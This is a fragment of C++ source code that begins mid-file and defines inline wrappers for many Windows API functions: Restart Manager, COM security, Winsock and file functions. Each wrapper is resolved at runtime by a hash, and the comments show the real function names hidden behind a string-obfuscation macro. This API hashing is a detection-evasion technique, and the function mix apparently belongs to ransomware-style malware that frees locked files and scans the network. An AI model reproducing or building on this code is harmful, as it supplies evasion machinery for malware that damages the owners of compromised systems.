	DWORD(WINAPI * pFunction)(DWORD, UINT, LPCWSTR*, UINT, RM_UNIQUE_PROCESS*, UINT, LPCWSTR*);
	pFunction = (DWORD(WINAPI*)(DWORD, UINT, LPCWSTR*, UINT, RM_UNIQUE_PROCESS*, UINT, LPCWSTR*))api::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0x2ad410e3, 65);//GetProcAddress(hRstrtmgr, OBFA("RmRegisterResources"));
	return pFunction(dwSessionHandle, nFiles, rgsFileNames, nApplications, rgApplications, nServices, rgsServiceNames);
}

inline DWORD WINAPI pRmShutdown(
	DWORD                    dwSessionHandle,
	ULONG                    lActionFlags,
	RM_WRITE_STATUS_CALLBACK fnStatus
)
{
	DWORD(WINAPI * pFunction)(DWORD, ULONG, RM_WRITE_STATUS_CALLBACK);
	pFunction = (DWORD(WINAPI*)(DWORD, ULONG, RM_WRITE_STATUS_CALLBACK))api::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0x22cb760f, 66);//GetProcAddress(hRstrtmgr, OBFA("RmShutdown"));
	return pFunction(dwSessionHandle, lActionFlags, fnStatus);
}

inline void WINAPI pCoUninitialize()
{
	VOID(WINAPI * pFunction)();
	pFunction = (VOID(WINAPI*)())api::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0xd3a7a468, 67);//GetProcAddress(hOle32, OBFA("CoUninitialize"));
	return pFunction();
}

inline HRESULT WINAPI pCoCreateInstance(
	REFCLSID  rclsid,
	LPUNKNOWN pUnkOuter,
	DWORD     dwClsContext,
	REFIID    riid,
	LPVOID* ppv
)
{
	HRESULT(WINAPI * pFunction)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
	pFunction = (HRESULT(WINAPI*)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*))api::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0xb32feeec, 68);//GetProcAddress(hOle32, OBFA("CoCreateInstance"));
	return pFunction(rclsid, pUnkOuter, dwClsContext, riid, ppv);
}

inline HRESULT WINAPI pCoSetProxyBlanket(
	IUnknown* pProxy,
	DWORD                    dwAuthnSvc,
	DWORD                    dwAuthzSvc,
	OLECHAR* pServerPrincName,
	DWORD                    dwAuthnLevel,
	DWORD                    dwImpLevel,
	RPC_AUTH_IDENTITY_HANDLE pAuthInfo,
	DWORD                    dwCapabilities
)
{
	HRESULT(WINAPI * pFunction)(IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD);
	pFunction = (HRESULT(WINAPI*)(IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD))api::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0xde5dbfdc, 69);//GetProcAddress(hOle32, OBFA("CoSetProxyBlanket"));
	return pFunction(pProxy, dwAuthnSvc, dwAuthzSvc, pServerPrincName, dwAuthnLevel, dwImpLevel, pAuthInfo, dwCapabilities);
}

inline HRESULT WINAPI pCoInitializeSecurity(
	PSECURITY_DESCRIPTOR        pSecDesc,
	LONG                        cAuthSvc,
	SOLE_AUTHENTICATION_SERVICE* asAuthSvc,
	void* pReserved1,
	DWORD                       dwAuthnLevel,
	DWORD                       dwImpLevel,
	void* pAuthList,
	DWORD                       dwCapabilities,
	void* pReserved3
)
{
	HRESULT(WINAPI * pFunction)(PSECURITY_DESCRIPTOR, LONG, SOLE_AUTHENTICATION_SERVICE*, void*, DWORD, DWORD, void*, DWORD, void*);
	pFunction = (HRESULT(WINAPI*)(PSECURITY_DESCRIPTOR, LONG, SOLE_AUTHENTICATION_SERVICE*, void*, DWORD, DWORD, void*, DWORD, void*))api::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0xcc12507f, 70);//GetProcAddress(hOle32, OBFA("CoInitializeSecurity"));
	return pFunction(pSecDesc, cAuthSvc, asAuthSvc, pReserved1, dwAuthnLevel, dwImpLevel, pAuthList, dwCapabilities, pReserved3);
}

inline HRESULT WINAPI pCoInitializeEx(
	LPVOID pvReserved,
	DWORD  dwCoInit
)
{
	HRESULT(WINAPI * pFunction)(LPVOID, DWORD);
	pFunction = (HRESULT(WINAPI*)(LPVOID, DWORD))api::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0x2bdbdf4e, 71);//GetProcAddress(hOle32, OBFA("CoInitializeEx"));
	return pFunction(pvReserved, dwCoInit);
}

inline hostent* WINAPI pgethostbyname(
	const char* name
)
{
	hostent* (WINAPI * pFunction)(const char*);
	pFunction = (hostent * (WINAPI*)(const char*))api::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0xbd6ac662, 75);//GetProcAddress(hWs2_32, OBFA("gethostbyname"));
	return pFunction(name);
}

inline int WINAPI pgethostname(
	char* name,
	int  namelen
)
{
	int (WINAPI * pFunction)(char*, int);
	pFunction = (int (WINAPI*)(char*, int))api::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x1260d6db, 76);//GetProcAddress(hWs2_32, OBFA("gethostname"));
	return pFunction(name, namelen);
}


inline SOCKET WINAPI psocket(
	int af,
	int type,
	int protocol
)
{
	SOCKET(WINAPI * pFunction)(int, int, int);
	pFunction = (SOCKET(WINAPI*)(int, int, int))api::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x00c1575b, 77);//GetProcAddress(hWs2_32, OBFA("socket"));
	return pFunction(af, type, protocol);
}

inline int WINAPI pWSAIoctl(
	SOCKET                             s,
	DWORD                              dwIoControlCode,
	LPVOID                             lpvInBuffer,
	DWORD                              cbInBuffer,
	LPVOID                             lpvOutBuffer,
	DWORD                              cbOutBuffer,
	LPDWORD                            lpcbBytesReturned,
	LPWSAOVERLAPPED                    lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
)
{
	int(WINAPI * pFunction)(SOCKET, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE);
	pFunction = (int(WINAPI*)(SOCKET, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE))api::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x1ad64c3e, 78);//GetProcAddress(hWs2_32, OBFA("WSAIoctl"));
	return pFunction(s, dwIoControlCode, lpvInBuffer, cbInBuffer, lpvOutBuffer, cbOutBuffer, lpcbBytesReturned, lpOverlapped, lpCompletionRoutine);
}

inline int WINAPI pclosesocket(
	IN SOCKET s
)
{
	int(WINAPI * pFunction)(SOCKET);
	pFunction = (int(WINAPI*)(SOCKET))api::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x4118bcd2, 79);//GetProcAddress(hWs2_32, OBFA("closesocket"));
	return pFunction(s);
}

inline INT WINAPI pWSAAddressToStringW(
	LPSOCKADDR          lpsaAddress,
	DWORD               dwAddressLength,
	LPWSAPROTOCOL_INFOW lpProtocolInfo,
	LPWSTR              lpszAddressString,
	LPDWORD             lpdwAddressStringLength
)
{
	int(WINAPI * pFunction)(LPSOCKADDR, DWORD, LPWSAPROTOCOL_INFOW, LPWSTR, LPDWORD);
	pFunction = (int(WINAPI*)(LPSOCKADDR, DWORD, LPWSAPROTOCOL_INFOW, LPWSTR, LPDWORD))api::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x5dacc2ba, 80);//GetProcAddress(hWs2_32, OBFA("WSAAddressToStringW"));
	return pFunction(lpsaAddress, dwAddressLength, lpProtocolInfo, lpszAddressString, lpdwAddressStringLength);
}

inline SOCKET WINAPI pWSASocketW(
	int                 af,
	int                 type,
	int                 protocol,
	LPWSAPROTOCOL_INFOW lpProtocolInfo,
	GROUP               g,
	DWORD               dwFlags
)
{
	SOCKET(WINAPI * pFunction)(int, int, int, LPWSAPROTOCOL_INFOW, GROUP, DWORD);
	pFunction = (SOCKET(WINAPI*)(int, int, int, LPWSAPROTOCOL_INFOW, GROUP, DWORD))api::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0xe558706f, 81);//GetProcAddress(hWs2_32, OBFA("WSASocketW"));
	return pFunction(af, type, protocol, lpProtocolInfo, g, dwFlags);
}

inline int WINAPI pbind(
	SOCKET         s,
	const sockaddr* addr,
	int            namelen
)
{
	int(WINAPI * pFunction)(SOCKET, const sockaddr*, int);
	pFunction = (int(WINAPI*)(SOCKET, const sockaddr*, int))api::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x4310229a, 82);//GetProcAddress(hWs2_32, OBFA("bind"));
	return pFunction(s, addr, namelen);
}

inline int WINAPI psetsockopt(
	SOCKET     s,
	int        level,
	int        optname,
	const char* optval,
	int        optlen
)
{
	int(WINAPI * pFunction)(SOCKET, int, int, const char*, int);
	pFunction = (int(WINAPI*)(SOCKET, int, int, const char*, int))api::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x55d15957, 83);//GetProcAddress(hWs2_32, OBFA("setsockopt"));
	return pFunction(s, level, optname, optval, optlen);
}

inline int WINAPI pgetsockopt(
	SOCKET s,
	int    level,
	int    optname,
	char* optval,
	int* optlen
)
{
	int(WINAPI * pFunction)(SOCKET, int, int, char*, int*);
	pFunction = (int(WINAPI*)(SOCKET, int, int, char*, int*))api::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0xe34ea561, 84);//GetProcAddress(hWs2_32, OBFA("getsockopt"));
	return pFunction(s, level, optname, optval, optlen);
}

inline int WINAPI pshutdown(
	SOCKET s,
	int    how
)
{
	int(WINAPI * pFunction)(SOCKET, int);
	pFunction = (int(WINAPI*)(SOCKET, int))api::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x61856121, 85);//GetProcAddress(hWs2_32, OBFA("shutdown"));
	return pFunction(s, how);
}

inline int WINAPI pWSAStartup(
	WORD      wVersionRequired,
	LPWSADATA lpWSAData
)
{
	int(WINAPI * pFunction)(WORD, LPWSADATA);
	pFunction = (int(WINAPI*)(WORD, LPWSADATA))api::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0xaf724aac, 86);//GetProcAddress(hWs2_32, OBFA("WSAStartup"));
	return pFunction(wVersionRequired, lpWSAData);
}

inline int WINAPI pWSACleanup()
{
	int(WINAPI * pFunction)();
	pFunction = (int(WINAPI*)())api::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x9812c1b7, 87);//GetProcAddress(hWs2_32, OBFA("WSACleanup"));
	return pFunction();
}

inline PCWSTR WSAAPI pInetNtopW(
	INT        Family,
	const VOID* pAddr,
	PWSTR      pStringBuf,
	size_t     StringBufSize
)
{
	PCWSTR(WINAPI * pFunction)(INT, const VOID*, PWSTR, size_t);
	pFunction = (PCWSTR(WINAPI*)(INT, const VOID*, PWSTR, size_t))api::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x7e2eafb0, 88);//GetProcAddress(hWs2_32, OBFA("InetNtopW"));
	return pFunction(Family, pAddr, pStringBuf, StringBufSize);
}

inline PCSTR WINAPI pStrStrIA(
	PCSTR pszFirst,
	PCSTR pszSrch
)
{
	PCSTR(WINAPI * pFunction)(PCSTR, PCSTR);
	pFunction = (PCSTR(WINAPI*)(PCSTR, PCSTR))api::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0x6877b7f6, 73);//GetProcAddress(hShlwapi, OBFA("StrStrIA"));
	return pFunction(pszFirst, pszSrch);
}

inline PCWSTR WINAPI pStrStrIW(
	PCWSTR pszFirst,
	PCWSTR pszSrch
)
{
	PCWSTR(WINAPI * pFunction)(PCWSTR, PCWSTR);
	pFunction = (PCWSTR(WINAPI*)(PCWSTR, PCWSTR))api::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0x5a8ce5b8, 74);//GetProcAddress(hShlwapi, OBFA("StrStrIW"));
	return pFunction(pszFirst, pszSrch);
}

inline HANDLE
WINAPI
pCreateEventA(
	_In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes,
	_In_ BOOL bManualReset,
	_In_ BOOL bInitialState,
	_In_opt_ LPCSTR lpName
)
{
	HANDLE(WINAPI * pFunction)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
	pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x92288a94, 89);
	return pFunction(lpEventAttributes, bManualReset, bInitialState, lpName);
}

inline BOOL
WINAPI
pSetEvent(
	_In_ HANDLE hEvent
)
{
	BOOL(WINAPI * pFunction)(HANDLE);
	pFunction = (BOOL(WINAPI*)(HANDLE))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x6a120745, 90);
	return pFunction(hEvent);
}

inline BSTR 
WINAPI 
pSysAllocString(
	const OLECHAR* psz
)
{
	BSTR(WINAPI * pFunction)(const OLECHAR*);
	pFunction = (BSTR(WINAPI*)(const OLECHAR*))api::GetProcAddressEx2(NULL, OLEAUT32_MODULE_ID, 0xe6bc0210, 91);
	return pFunction(psz);
}

inline VOID
WINAPI 
pVariantInit(VARIANTARG* pvarg)
{
	VOID(WINAPI * pFunction)(VARIANTARG*);
	pFunction = (VOID(WINAPI*)(VARIANTARG*))api::GetProcAddressEx2(NULL, OLEAUT32_MODULE_ID, 0x5243a16a, 92);
	return pFunction(pvarg);
}

inline HRESULT
WINAPI 
pVariantClear(
	VARIANTARG* pvarg
)
{
	HRESULT(WINAPI * pFunction)(VARIANTARG*);
	pFunction = (HRESULT(WINAPI*)(VARIANTARG*))api::GetProcAddressEx2(NULL, OLEAUT32_MODULE_ID, 0xeedec24b, 93);
	return pFunction(pvarg);
}

inline
DWORD
WINAPI
pSetFilePointer(
	HANDLE hFile,
	LONG lDistanceToMove,
	PLONG lpDistanceToMoveHigh,
	DWORD dwMoveMethod
)
{
	DWORD(WINAPI * pFunction)(HANDLE, LONG, PLONG, DWORD);
	pFunction = (DWORD(WINAPI*)(HANDLE, LONG, PLONG, DWORD))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa897e98d, 94);
	return pFunction(hFile, lDistanceToMove, lpDistanceToMoveHigh, dwMoveMethod);
}

inline
int 
WINAPI 
pwvsprintfW(
	LPWSTR Buf,
	LPCWSTR Format,
	va_list arglist
)
{
	int(WINAPI * pFunction)(LPWSTR, LPCWSTR, va_list);
	pFunction = (int(WINAPI*)(LPWSTR, LPCWSTR, va_list))api::GetProcAddressEx2(NULL, USER32_MODULE_ID, 0xc88071b1, 95);
	return pFunction(Buf, Format, arglist);
}